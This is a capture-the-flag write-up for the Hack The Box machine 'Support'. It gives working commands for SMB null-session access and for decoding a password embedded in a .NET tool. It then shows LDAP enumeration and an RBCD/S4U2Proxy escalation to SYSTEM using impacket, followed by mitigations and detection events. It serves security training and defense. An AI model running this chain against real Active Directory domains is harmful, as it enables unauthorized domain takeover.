---
machine: Support
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, smb, reversing, ldap, rbcd, genericall, s4u2proxy]
---

# Support — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no flags or real credentials.

## TL;DR

The `support-tools` share is readable over a null session and ships `UserInfo.exe.zip`, an internal tool that talks LDAP. Reversing it yields the `ldap` user's password (XOR + base64 inside `Protected.getPassword()`). That account enumerates the domain, and `support` keeps its password in the `info` attribute. `support` gets WinRM and belongs to `Shared Support Accounts`, which holds **GenericAll over the DC computer object**: with the default machine quota a computer account is created, **RBCD** is configured, and S4U2Proxy impersonates `Administrator` against `cifs/DC.support.htb`.

## Recon

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV <IP> -oN nmap_svc.txt
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: support.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
3268/tcp  open  ldap          Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
```

Host `DC`, domain `support.htb`.

```bash
echo "<IP> support.htb dc.support.htb" | sudo tee -a /etc/hosts
```

## Enumeration

```bash
smbclient -N -L //<IP>
smbclient -N //<IP>/support-tools
```

The share mixes public installers (`7-ZipPortable`, `npp`, `putty`, `SysinternalsSuite`, `WiresharkPortable`) with **`UserInfo.exe.zip`**, the only binary you cannot download from the Internet. That makes it the target.

Reversing the .NET executable (dnSpy/ILSpy, or `strings` first):

```bash
unzip UserInfo.exe.zip
strings -n 6 UserInfo.exe | head -50
```

Class `Protected` implements `getPassword()`: an array XORed with the key `armando` and then base64. Reimplemented in Python:

```python
import base64
enc = bytes([...])                      # array from Protected's constructor
key = b"armando"
print(base64.b64decode(bytes(b ^ key[i % len(key)] for i, b in enumerate(enc))))
```

Alternative without static reversing: run the binary with `mono` under Wireshark and read the clear-text `simple bind`, or point it at your own `ldap.conf`.

With `ldap`'s password the domain is enumerated:

```bash
nxc smb <IP> -u ldap -p '<PASSWORD>'
ldapsearch -x -H ldap://<IP> -D 'ldap@support.htb' -w '<PASSWORD>' \
  -b 'DC=support,DC=htb' '(objectClass=user)' sAMAccountName info memberOf
```

**`support`**'s `info` attribute holds a clear-text password. The account is in `Remote Management Users` and `Shared Support Accounts`.

## Foothold

```bash
nxc winrm <IP> -u support -p '<PASSWORD>'
evil-winrm -i <IP> -u support -p '<PASSWORD>'
```

## Lateral movement

No second host. The interesting part is the hop from user to SYSTEM inside the same DC through AD permissions.

## Privilege escalation

BloodHound with `support`'s credentials:

```bash
bloodhound-python -u support -p '<PASSWORD>' -d support.htb -ns <IP> -c All
```

The key edge is **`Shared Support Accounts` → GenericAll → `DC.SUPPORT.HTB`** (the controller's computer object). GenericAll on a machine account lets you write `msDS-AllowedToActOnBehalfOfOtherIdentity`, which is exactly RBCD.

1. Machine quota (10 by default) → create a computer account:

```bash
impacket-addcomputer support.htb/support:'<PASSWORD>' -dc-ip <IP> \
  -computer-name 'FAKE$' -computer-pass '<MACHINE_PASS>'
```

2. Write the delegation onto `DC$`:

```bash
impacket-rbcd -dc-ip <IP> -action write \
  -delegate-from 'FAKE$' -delegate-to 'DC$' \
  -hashes :<SUPPORT_NTLM> support.htb/support
```

3. S4U2Self + S4U2Proxy to request a service ticket as `Administrator`:

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator \
  -dc-ip <IP> 'support.htb/FAKE$:<MACHINE_PASS>'
```

4. Use the ticket:

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass dc.support.htb
```

The shell comes back as `NT AUTHORITY\SYSTEM`.

## Evidence

- Trimmed `secretsdump`/`psexec` output and the ticket in `klist`.
- No flags, hashes or passwords: real values live in `private/`.

## Lessons learned

- A "support tools" share is in-house code: reverse it instead of ignoring it.
- XOR + base64 in .NET is not encryption; `dnSpy` shows it in two clicks and the clear-text LDAP bind confirms it.
- `info` is again the leaking attribute (as `description` on other boxes).
- GenericAll over a **computer** is RBCD, not "read only": look at the object type, not just the edge label.
- The default machine quota (10) is what makes the attack possible without being admin.

## Mitigations and detection

- Never embed credentials in distributed binaries: secrets belong in a vault or a managed identity.
- Review `info`/`description` and restrict who can read them.
- Remove unnecessary GenericAll over computer objects and set `ms-DS-MachineAccountQuota = 0`.
- Monitor computer-account creation by non-admins (event 4741) and writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` (5136 with that attribute).
- S4U detection: 4769 with a non-empty `Transited Services` on the DC.

MITRE: T1552.001 (credentials in files), T1087.002 (domain account discovery), T1098 (account manipulation), T1550.003 (pass the ticket), T1134.001 (token impersonation).

## References

- <https://www.hackthebox.com/machines/support>
- <https://0xdf.gitlab.io/2022/12/17/htb-support.html>
- <https://pencer.io/ctf/ctf-htb-support>
- <https://learn.microsoft.com/en-us/defender-for-identity/security-alert-rbcd>
